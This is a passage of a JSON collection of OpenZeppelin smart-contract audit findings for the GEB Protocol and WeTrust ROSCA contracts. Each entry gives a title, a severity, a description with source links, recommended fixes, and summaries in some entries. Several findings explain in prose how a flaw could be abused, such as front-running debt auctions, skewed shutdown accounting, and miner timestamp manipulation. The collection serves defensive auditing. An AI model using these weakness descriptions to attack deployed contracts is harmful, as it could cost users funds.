      "content": "English-like auctions differs from fixed-discount ones because the amount that has to be sold  \n\nis auctioned among bidders competing to offer more system coins ([in a first phase](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L236)) for less and less collateral to buy (during a [second phase](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L264)).\n\n\nIn this kind of auction, there are two important parameters to take into account:\n\n\n* [bidExpiry](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L74): the time after which a bid can be settled (by contract set to 3 hours after the bid is placed).\n* [auctionDeadline](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L76): the amount of time an auction can last.\n\n\nWhenever a [bid expires or the auction deadline has passed](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L295), anyone can call the [`settleAuction` function](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L296) and terminate it.\n\n\nMoreover, the very first bid can be any small `bidAmount &gt; 0` and any consecutive [bid must be 1.05x times greater than the previous one](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L244). The reason why the first bid can be whatever positive amount is because collateral auctions [are started from the `LiquidationEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L369) with an initial `bidAmount = 0`.\n\n\nDuring network congestion, bidders’ transactions may not be processed, allowing very low priced bids to be filled with no counterparty bidders competing against them. Since we understand that the Reflexer team intends to implement fixed-discount auctions, we list this issue to make the risks of English style auctions clear. Consider implementing fixed-discount auctions to alleviate this problem. Make sure to implement appropriate tests simulating high network congestion. Additionally, to avoid users bidding with tiny amounts consider establishing a non-zero minimum value for the first bid.\n\n\n***Update:** Acknowledged. Reflexer Labs’ statement for the issue:*\n\n\n\n> \n>  We know about the problem and we plan to use fixed discount auctions in RAI’s case.\n> \n> \n>",
      "summary": "\nThis bug report is about English-like auctions, which differ from fixed-discount ones because the amount that has to be sold is auctioned among bidders competing to offer more system coins for less and less collateral to buy. In this type of auction, there are two parameters to take into account: bidExpiry (the time after which a bid can be settled) and auctionDeadline (the amount of time an auction can last). Whenever a bid expires or the auction deadline has passed, anyone can call the 'settleAuction' function and terminate it. Moreover, the very first bid can be any small amount greater than 0, and any consecutive bid must be 1.05x times greater than the previous one.\n\nHowever, during network congestion, bidders’ transactions may not be processed, allowing very low priced bids to be filled with no counterparty bidders competing against them. To avoid this problem, it is suggested that fixed-discount auctions should be implemented, with appropriate tests simulating high network congestion, and a non-zero minimum value for the first bid. Reflexer Labs has acknowledged the issue and stated that they plan to use fixed-discount auctions in RAI’s case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11199",
      "title": "[M01] Starting debt auctions can be prevented",
      "impact": "MEDIUM",
      "content": "Within the [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol) contract, the function [`auctionDebt`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L259) contains a check that the `AccountingEngine` contract instance [has no system coin balance](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L261). However, the [`transferInternalCoins` function](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L313) within the [`SAFEEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol) contract allows transfers of internal tokens to any contract, provided [`canModifySafe(src, msg.sender)`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L314) returns true. Thus, any user can transfer their internal coins to the `AccountingEngine` contract. For any nonzero amount of coins, this will cause [the check within `auctionDebt`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L261) to fail.\n\n\nThe result of this is that any user can front-run calls to `auctionDebt` to prevent them from executing, effectively preventing any new debt auctions from starting. However, it should be noted that eventually, the front-runner may fail in their front-running attempt, and at that point a new debt auction can begin.\n\n\nConsider replacing this check with a call to [`settleDebt(safeEngine.coinBalance(address(this))`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L235) before [the balance check](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L261) is enforced. This may require changing the visibility of `settleDebt` to `public`.\n\n\n***Update:** Fixed in [pull request #75.](https://github.com/reflexer-labs/geb/pull/75/files)*",
      "summary": "\nA bug was discovered in the AccountingEngine contract within the Github repository reflexer-labs/geb. The bug is related to the function auctionDebt, which contains a check that the AccountingEngine contract instance has no system coin balance. However, the function transferInternalCoins within the SAFEEngine contract allows transfers of internal tokens to any contract. As a result, any user can transfer their internal coins to the AccountingEngine contract, causing the check within auctionDebt to fail.\n\nThis means that any user can front-run calls to auctionDebt, preventing any new debt auctions from starting. However, the front-runner may fail in their attempt and a new debt auction can begin. To fix this issue, the visibility of the settleDebt function should be changed to public and a call to settleDebt should be made before the balance check is enforced. The bug has been fixed in pull request #75.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11198",
      "title": "[H01] fastTrackAuction accounts for debt incorrectly",
      "impact": "HIGH",
      "content": "Currently, when the [system is shutdown](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L254), if there are any collateral auctions still occurring they can be ended by calling [`fastTrackAuction`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L281). This function is designed to [end the auction](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L296) and [return unsold collateral and unsettled debt](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L301) from the auction to the original SAFE owner. Notice that in english type auctions, the [unsold collateral is the initial amount](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L321), since english auctions can be terminated prematurely only in the first phase, where no collateral is sold. On the contrary, fixed-discount type of auctions [sell part of the initial collateral](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L826) whenever a user calls the `buyCollateral()` function. For this reason, unsold collateral in this case can be lower than the initial amount.\n\n\nA SAFE owner will [receive back](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L301) only the amount of collateral that [was not sold, `collateralToSell`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L289). However, the debt they receive back, which is [originally taken from the SAFE when liquidation starts](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L360-L361), will end up being the [same amount as was initially taken](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L298). This means that when a SAFE’s collateral auction is fast-tracked, they lose collateral but retain the same amount of debt.\n\n\nThis has the wider effect that SAFEs become even more under-collateralized than they were before. When [`processSAFE`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L304) is called, these SAFEs will artificially [increase `collateralShortfall`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L311-L314) more than they should. In the same way, the [`collateralTotalDebt`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L299) is incorrectly increased. This will have effects also in [the calculation of `redemptionAdjustedDebt`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L357) which is accounted together with `collateralShortfall` to calculate the final [`collateralCashPrice`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L359-L360). This will result in an skewed value of `collateralCashPrice`, potentially lowering the value of all coins [upon redemption](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L372-L378).\n\n\nConsider changing [line 298](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L298) to use the difference between the values of `bids[id].amountToRaise` and `bids[id].raisedAmount` in place of `amountToRaise`. These values may need to be fetched with the [other auction parameters](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L288-L291), since auction data will be [deleted](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L313) within [the call to `terminateAuctionPrematurely`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L296). This will correct the issue of `debt_` being too high on [line 301](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L301), which currently causes the liquidated SAFE to receive [the same `.generatedDebt` as when it started](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L490), even when an auction has sold some collateral. Note that this problem also results in erroneous accounting for the [`debtBalance` of `AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L499-L501) and [`globalUnbackedDebt`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/SAFEEngine.sol#L503-L505).\n\n\n***Update**: Fixed in [pull request #74.](https://github.com/reflexer-labs/geb/pull/74/files)*",
      "summary": "\nThis bug report is about an issue in the system when it is shutdown. When the system is shutdown, if there are any collateral auctions still occurring they can be ended by calling `fastTrackAuction` function. This function is designed to end the auction and return unsold collateral and unsettled debt from the auction to the original SAFE owner. However, the debt that the SAFE owner receives back is the same amount as was initially taken, which means that when a SAFE’s collateral auction is fast-tracked, they lose collateral but retain the same amount of debt. This has the wider effect that SAFEs become even more under-collateralized than they were before and the calculation of `collateralCashPrice` is skewed, potentially lowering the value of all coins upon redemption. \n\nTo fix this issue, the developers suggested changing line 298 to use the difference between the values of `bids[id].amountToRaise` and `bids[id].raisedAmount` in place of `amountToRaise`. This was fixed in pull request #74.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12149",
      "title": "Use latest version of Solidity",
      "impact": "LOW",
      "content": "[Current code](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L1) is written for an old version of solc (0.4.4). We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.10;`) to enforce latest compiler version to be used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12148",
      "title": "Naming suggestions",
      "impact": "LOW",
      "content": "* The **members\\_** constructor parameter could be confused as the full set of members, and it is in fact al members but the contract creator. Consider calling it **otherMembers\\_** or something like so, to avoid this confusion.\n* The **grossTotalFees** uint256 variable [in recalculateTotalFees](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L300) is not really the gross total fees, because it’s never multiplied by the service fee per mille. Consider renaming it to **grossTotal** or something like so, to avoid confusion.\n* The **totalDiscounts** uint256 contract variable does not represent the total discounts, but the discounts per member. Consider renaming to **discountPerMember** to avoid confusion.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12147",
      "title": "Avoid duplicated code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the code’s intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others.\n\n\nThe logic in [getParticipantBalance()](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L441) and [the start of withdraw()](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L406-L418) is very similar and could be refactored to avoid repetition. Consider using getParticipantBalance in withdraw.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12146",
      "title": "totalFees will always be 0 on LogFundsWithdrawal",
      "impact": "LOW",
      "content": "In [line 502 of ROSCA.sol](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L502), a **LogFundsWithdrawal** event is emitted if the send does not fail. The problem is that the variable `totalFees` will always be 0, as it is set to 0 [in line 495](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L495)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12145",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol)[see this guide](https://zeppelin-solidity.readthedocs.io/en/latest/bounty.html)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12144",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29)\n\n\n* <https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L341>\n* <https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L389>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12143",
      "title": "Use of send",
      "impact": "LOW",
      "content": "Use of **send** is always risky and should be analyzed in detail. Three occurrences found in [line 427](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L427), [“>line 476](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L476%22), and[line 496](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L496) of ROSCA.sol.\n\n\n* [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.\n* [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): OK.\n* [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): Warning. All 3 occurrences of send are push payments. Although we couldn’t find any attack vectors on this contract, consider using [OpenZeppelin’s PullPayment contract](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/payment/PullPayment.sol) to implement pull payments in ROSCA.sol.\n\n\nFor more info on this problem,[see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12142",
      "title": "Timestamp usage",
      "impact": "MEDIUM",
      "content": "There’s a problem with using timestamps and **now** (alias for **block.timestamp**) for contract logic, based on the fact that miners can perform some manipulation. In general,[it’s better not to rely on timestamps for contract logic](https://github.com/ConsenSys/smart-contract-best-practices#timestamp-dependence). The solutions is to use **block.number** instead, and approximate dates with expected block heights and time periods with expected block amounts.\n\n\nThe ROSCA.sol contract uses timestamps at [several](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L198) [points”>The risk of miner manipulation, though, is really low. The potential damage is also limited: miners could only slightly manipulate when each round starts and who the winner is in each round.](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L258%22). As [this comment notes](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L256%22), this won’t affect the functioning of the contract, but the miner of the **cleanUpPreviousRound** call transaction will have absolute control on who the next winner is. We recommend the team to consider the potential risk of this manipulation and switch to **block.number** if necessary.\n\n\nFor more info on this topic, see [this stack exchange question](https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp)",
      "summary": "\nThis bug report is about the potential manipulation of timestamps and now (alias for block.timestamp) by miners in a smart contract. It is better not to rely on timestamps for contract logic as miners can manipulate them. The ROSCA.sol contract uses timestamps at several points and the potential damage is limited as miners can only slightly manipulate when each round starts and who the winner is. It is recommended to switch to block.number instead to avoid the potential risk of manipulation. For more information on this topic, a stack exchange question is linked.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12141",
      "title": "Be careful with integer division",
      "impact": "MEDIUM",
      "content": "Several parts of the code use integer division. See [1](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L288),[2](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L316), [3](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L341), [4](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L381), [5](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L389/). Integer division result will discard the remainder and keep the quotient. This could bring unexpected results in some cases.\n\n\nFor example, in [line 288](https://github.com/WeTrustPlatform/rosca-contracts/blob/2af29be97d529488f5488fe0592f9e6b3585254f/contracts/ROSCA.sol#L288), if **currentRoundTotalDiscounts** is not a multiple of **membersAddresses.length**, **totalDiscounts**will be incremented by the quotient, and the remainder of the division will not be considered.\n\n\nWe haven’t detected any actual attacks or inconsistencies in the contract due to this fact, but we recommend being extra careful. In this case, a solution could be to make **totalDiscounts** have the total amount of discounts instead of the discounts per member.",
      "summary": "\nThis bug report is about the use of integer division in several parts of the code. Integer division discards the remainder and keeps the quotient, which can lead to unexpected results. An example of this is in line 288, if the currentRoundTotalDiscounts is not a multiple of membersAddresses.length, totalDiscounts will be incremented by the quotient, and the remainder of the division will not be considered. While no actual attacks or inconsistencies have been found, it is recommended to take extra caution. A potential solution could be making totalDiscounts have the total amount of discounts instead of the discounts per member.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12140",
      "title": "Use safe math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. It’s always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.",
      "summary": "\nThis bug report is about unchecked math operations in the code. It is important to perform checked operations to ensure safety. A safe math library like OpenZeppelin's SafeMath library can be used, or pre-condition checks on any math operation can be performed. This is to prevent any issues that may arise from unchecked math operations in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WeTrust ROSCA contract code audit",
      "source_link": "https://blog.openzeppelin.com/wetrust-rosca-contract-code-audit-928a536c5dd2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}